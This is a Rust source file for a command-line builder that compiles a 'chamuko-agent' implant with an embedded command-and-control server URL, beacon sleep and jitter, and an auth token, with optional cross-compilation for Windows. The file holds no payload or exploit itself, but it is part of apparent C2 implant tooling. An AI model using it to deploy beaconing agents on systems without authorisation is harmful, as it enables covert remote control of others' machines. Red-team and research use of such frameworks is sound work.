use std::env;
use std::path::PathBuf;
use std::process::Command;

struct Config {
    url: String,
    sleep: u64,
    jitter: u64,
    name: String,
    token: Option<String>,
    output: PathBuf,
    release: bool,
    target: Option<String>,
}

fn main() {
    let config = match parse_args() {
        Ok(c) => c,
        Err(msg) => {
            eprintln!("error: {msg}");
            print_help();
            std::process::exit(1);
        }
    };

    if let Err(e) = build(&config) {
        eprintln!("build failed: {e}");
        std::process::exit(1);
    }
}

fn parse_args() -> Result<Config, String> {
    let args: Vec<String> = env::args().skip(1).collect();
    let mut url = String::new();
    let mut sleep = 10u64;
    let mut jitter = 3u64;
    let mut name = String::new();
    let mut token: Option<String> = None;
    let mut output = PathBuf::from("./chamuko-agent");
    let mut release = true;
    let mut target: Option<String> = None;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--url" | "-u" => {
                i += 1;
                url = take(&args, i)?;
            }
            "--sleep" | "-s" => {
                i += 1;
                let v = take(&args, i)?;
                sleep = v.parse().map_err(|_| format!("invalid sleep: {v}"))?;
            }
            "--jitter" | "-j" => {
                i += 1;
                let v = take(&args, i)?;
                jitter = v.parse().map_err(|_| format!("invalid jitter: {v}"))?;
            }
            "--name" | "-n" => {
                i += 1;
                name = take(&args, i)?;
            }
            "--token" => {
                i += 1;
                token = Some(take(&args, i)?);
            }
            "--output" | "-o" => {
                i += 1;
                output = PathBuf::from(take(&args, i)?);
            }
            "--target" | "-t" => {
                i += 1;
                target = Some(take(&args, i)?);
            }
            "--debug" => release = false,
            "--release" => release = true,
            "--help" | "-h" => {
                print_help();
                std::process::exit(0);
            }
            other => return Err(format!("unknown argument: {other}")),
        }
        i += 1;
    }

    if url.is_empty() {
        return Err("--url is required".to_string());
    }

    Ok(Config {
        url,
        sleep,
        jitter,
        name,
        token,
        output,
        release,
        target,
    })
}

fn take(args: &[String], i: usize) -> Result<String, String> {
    args.get(i)
        .cloned()
        .ok_or_else(|| "missing value".to_string())
}

fn print_help() {
    eprintln!(
        "chamuko-builder: compile a chamuko-agent with embedded C2 config\n\n\
         USAGE:\n  \
         chamuko-builder --url <URL> [OPTIONS]\n\n\
         OPTIONS:\n  \
         --url <URL>        C2 server URL (required)\n  \
         --sleep <s>        base beacon sleep seconds (default: 10)\n  \
         --jitter <s>       max random jitter seconds (default: 3)\n  \
         --name <name>      agent label (default: empty)\n  \
         --token <tok>      C2 auth token embedded in the agent\n  \
         --output <path>    output binary path (default: ./chamuko-agent)\n  \
         --target <triple>  cross-compile target (e.g. x86_64-pc-windows-gnu)\n  \
         --debug            build in debug mode (default: release)\n  \
         --release          build in release mode (default)\n  \
         --help             show this help"
    );
}

fn build(config: &Config) -> Result<(), String> {
    let workspace_root = find_workspace_root()?;
    eprintln!("[builder] workspace: {}", workspace_root.display());

    let profile = if config.release { "release" } else { "debug" };

    eprintln!(
        "[builder] building agent: url={} sleep={} jitter={} name='{}' auth={} profile={}",
        config.url,
        config.sleep,
        config.jitter,
        config.name,
        if config.token.is_some() { "token" } else { "none" },
        profile
    );

    let is_windows_target = config
        .target
        .as_deref()
        .is_some_and(|t| t.contains("windows"));
    let binary_name = if cfg!(windows) || is_windows_target {
        "chamuko-agent.exe"
    } else {
        "chamuko-agent"
    };

    let mut cmd = Command::new("cargo");
    cmd.arg("build")
        .arg("-p")
        .arg("chamuko-agent")
        .current_dir(&workspace_root)
        .env("CHAMUKO_C2_URL", &config.url)
        .env("CHAMUKO_SLEEP", config.sleep.to_string())
        .env("CHAMUKO_JITTER", config.jitter.to_string())
        .env("CHAMUKO_NAME", &config.name)
        .env("CHAMUKO_TOKEN", config.token.as_deref().unwrap_or(""));

    if config.release {
        cmd.arg("--release");
    }
    if let Some(t) = &config.target {
        cmd.arg("--target").arg(t);
    }

    let status = cmd
        .status()
        .map_err(|e| format!("failed to run cargo: {e}"))?;
    if !status.success() {
        return Err("cargo build failed".to_string());
    }

    let mut bin_path = workspace_root.join("target");
    if let Some(t) = &config.target {
        bin_path = bin_path.join(t);
    }
    bin_path = bin_path.join(profile).join(binary_name);

    if !bin_path.exists() {
        return Err(format!(
            "built binary not found at {}",
            bin_path.display()
        ));
    }

    if let Some(parent) = config.output.parent() {
        if !parent.as_os_str().is_empty() {
            std::fs::create_dir_all(parent)
                .map_err(|e| format!("failed to create output dir: {e}"))?;
        }
    }
    std::fs::copy(&bin_path, &config.output)
        .map_err(|e| format!("failed to copy binary: {e}"))?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let perms = std::fs::Permissions::from_mode(0o755);
        let _ = std::fs::set_permissions(&config.output, perms);
    }

    eprintln!(
        "[builder] done: {} ({} bytes)",
        config.output.display(),
        std::fs::metadata(&config.output)
            .map(|m| m.len())
            .unwrap_or(0)
    );
    Ok(())
}

fn find_workspace_root() -> Result<PathBuf, String> {
    let mut dir = env::current_dir().map_err(|e| format!("cannot get cwd: {e}"))?;
    loop {
        let cargo = dir.join("Cargo.toml");
        if cargo.exists() {
            if let Ok(text) = std::fs::read_to_string(&cargo) {
                if text.contains("[workspace]") {
                    return Ok(dir);
                }
            }
        }
        if !dir.pop() {
            return Err(
                "could not find workspace root (no Cargo.toml with [workspace])".to_string(),
            );
        }
    }
}
